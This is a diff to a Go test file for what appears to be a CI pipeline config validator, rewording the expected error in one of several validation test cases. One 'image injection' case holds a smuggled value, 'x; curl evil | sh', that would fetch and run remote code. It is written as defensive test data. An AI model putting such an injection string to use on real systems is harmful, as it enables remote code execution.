@@ -158,7 +158,7 @@ func TestValidationErrors(t *testing.T) {
 		{"shell on non-run", job("        steps:\n          - uses: checkout\n            shell: bash\n"), "stages[0].jobs[0].steps[0].shell", "only to run steps"},
 		{"unknown shell", job("        steps:\n          - run: x\n            shell: fish\n"), "stages[0].jobs[0].steps[0].shell", "unknown shell"},
 		{"with on run", job("        steps:\n          - run: x\n            with:\n              a: b\n"), "stages[0].jobs[0].steps[0].with", "only to uses steps"},
-		{"image injection", job("        steps:\n          - pushImage:\n              image: \"x; curl evil | sh\"\n"), "stages[0].jobs[0].steps[0].pushImage.image", "not valid in an image reference"},
+		{"image injection", job("        steps:\n          - pushImage:\n              image: \"x; curl evil | sh\"\n"), "stages[0].jobs[0].steps[0].pushImage.image", "not a valid image reference"},
 		{"bad event", job("        when:\n          events: [tag]\n        steps:\n          - run: x\n"), "stages[0].jobs[0].when.events[0]", "unknown event"},
 		{"empty condition", job("        when: {}\n        steps:\n          - run: x\n"), "stages[0].jobs[0].when", "condition is empty"},
 		{"bad pattern", strings.Replace(minimal, "push: {}", "push:\n    branches: [\"feat/*/x\"]", 1), "triggers.push.branches[0]", "unsupported pattern"},
